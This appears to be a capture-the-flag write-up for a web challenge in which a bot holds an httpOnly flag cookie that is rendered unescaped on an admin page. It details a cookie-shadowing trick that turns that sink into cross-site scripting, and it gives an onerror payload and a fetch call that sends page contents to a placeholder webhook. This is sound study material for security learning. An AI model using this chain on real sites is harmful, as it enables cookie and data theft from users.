# Neon Skies (PwnSec CTF 2026) — web, medium, 347 pts

Flag format: `pwnsec{...}`. UNSOLVED live (event ended before I fired), but fully reversed.
Class: **XSS-bot reads httpOnly flag cookie that is rendered UNescaped on an authed page → cookie tossing / cookie shadowing → same-origin XSS → exfil.**

## Architecture
- `middleware` (nginx, port 8000) is the single public origin. Routes: `/report*` → bot (Node/Express),
  everything else → `neon_skies` (Crystal app). So the report desk and the app are SAME ORIGIN.
- `bot` (Playwright/Chromium) logs in as `archivist`, sets a cookie
  `FLAG = <real flag>` with `httpOnly:true, sameSite:"Strict"`, url = app origin (path defaults to `/`),
  then `page.goto(reportedUrl)` and dwells 8s.
- Crystal app: `SIGNAL_COOKIE = "FLAG"`. `/admin` (requires valid `sid` session) renders:
  `<output id="flag"><%= @flag %></output>` where `@flag = cookie_value(request, "FLAG")`.
  **This is the ONLY unescaped sink** — every other output uses `HTML.escape`. Auth is SHA-256 +
  constant-time (no bypass); sessions are `Random::Secure.hex(32)` (unguessable).

## Key insight (the tell)
Flag is delivered as an **httpOnly** cookie → JS can't read it via `document.cookie`. BUT the same
cookie is rendered **raw** into `/admin`. Two consequences:
1. To READ it, you need same-origin script that can fetch `/admin` and scrape `#flag`.
2. httpOnly prevents JS *reading/overwriting-at-same-path*, but NOT **creating another cookie of the
   same name at a different path** ("cookie tossing"). Because `@flag` is rendered unescaped, a
   shadowing `FLAG` cookie whose value is an XSS payload will EXECUTE when the bot loads `/admin`.

## Intended exploit (cookie shadowing → XSS → self-exfil)
1. Attacker page (any origin) that the bot will visit sets a path-scoped cookie on the app origin.
   Simplest same-origin gadget: report a URL that first lands on an app page and use a small hop, or
   host an attacker page that does a top-level redirect while setting a cookie. Concretely, on the app
   origin run:
   `document.cookie = "FLAG=<img src=x onerror=PAYLOAD>; path=/admin"`
   (httpOnly real cookie is at path `/`; ours at `/admin` is MORE specific → browser sends ours first,
   and Crystal's `request.cookies["FLAG"]` reads OUR value on `/admin`.)
2. Navigate the bot (it holds the admin `sid`) to `/admin`. Our payload renders raw → XSS runs on the
   app origin as the authenticated admin.
3. PAYLOAD recovers the REAL flag: delete our own `/admin`-scoped cookie
   (`document.cookie="FLAG=; path=/admin; expires=Thu, 01 Jan 1970..."` — allowed, it's not httpOnly),
   then `fetch('/admin')` again → now only the httpOnly `/`-scoped real flag is sent → parse the
   `<output id="flag">` value from the response text → exfil to attacker webhook:
   `fetch('https://WEBHOOK/?f='+encodeURIComponent(document.body.innerHTML))` (or regex out pwnsec{...}).
4. Report the same-origin URL so the bot executes the chain within its 8s dwell.

Notes: `X-Frame-Options: DENY` and `Referrer-Policy` are set, but no CSP → inline/handler XSS is fine.
SameSite=Strict is irrelevant because the bot does top-level same-origin navigation and carries cookies.

## Generalization / TELL to recognize next time
- "XSS bot + flag stored in a cookie" where the cookie is **httpOnly** but ALSO **rendered on a page**
  → the httpOnly flag is bypassable: either (a) the rendered page leaks it to same-origin JS, and/or
  (b) **cookie tossing** (same-name cookie at a more specific path) turns an unescaped cookie sink into
  same-origin XSS. Commit to building this immediately; do NOT conclude "no XSS."
- Single unescaped template sink among many escaped ones = that's the intended injection point.
